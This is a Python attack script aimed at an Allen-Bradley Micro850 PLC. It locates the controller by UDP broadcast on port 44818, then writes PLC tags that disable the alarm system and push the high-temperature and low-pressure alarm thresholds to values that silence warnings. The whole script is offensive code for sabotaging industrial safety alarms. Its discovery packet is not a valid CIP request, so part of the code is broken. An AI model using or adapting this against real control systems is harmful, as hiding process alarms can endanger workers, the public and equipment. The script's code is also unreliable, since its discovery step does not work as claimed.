from pylogix import PLC
import socket
import struct

def find_plc_ip():
    """Scans the local network for the PLC's IP address using a UDP broadcast."""
    BROADCAST_IP = "255.255.255.255"
    UDP_PORT = 44818  # CIP protocol port for Allen-Bradley devices

    # Create a UDP socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    sock.settimeout(5)  # Timeout of 5 seconds

    # Send a CIP broadcast packet to discover devices
    discovery_packet = bytes.fromhex("636F706C6F63617465")  # Example broadcast request
    
    try:
        sock.sendto(discovery_packet, (BROADCAST_IP, UDP_PORT))  # Send discovery packet
        data, addr = sock.recvfrom(1024)  # Receive response
        sock.close()
        
        plc_ip = addr[0]
        print(f"[+] Found PLC at IP: {plc_ip}")
        return plc_ip
    except socket.timeout:
        print("[-] No PLC found on network. Ensure it is online.")
        sock.close()
        return None

def modify_alarm_settings(plc_ip):
    """Modifies alarm settings in the Micro850 PLC to suppress alarms."""
    with PLC() as comm:
        comm.IPAddress = plc_ip

        # Example alarm settings to modify
        alarm_tags = [
            "Alarm_Enable",  # If this exists, disable it
            "High_Temp_Alarm",  # Modify threshold
            "Low_Pressure_Alarm"  # Modify threshold
        ]

        try:
            # Disabling the alarm system
            comm.Write(alarm_tags[0], 0)  
            print(f"[+] Disabled alarm system at {alarm_tags[0]}")

            # Modify alarm thresholds to suppress warnings
            comm.Write(alarm_tags[1], 9999)  # Set high temp alarm to an unlikely value
            comm.Write(alarm_tags[2], 0)  # Set low pressure alarm to zero
            
            print(f"[+] Modified {alarm_tags[1]} and {alarm_tags[2]} to suppress alerting.")
        
        except Exception as e:
            print(f"[-] Error modifying alarm settings: {e}")

if __name__ == "__main__":
    plc_ip = find_plc_ip()
    
    if plc_ip:
        modify_alarm_settings(plc_ip)
    else:
        print("[-] Could not locate the PLC IP. Exiting.")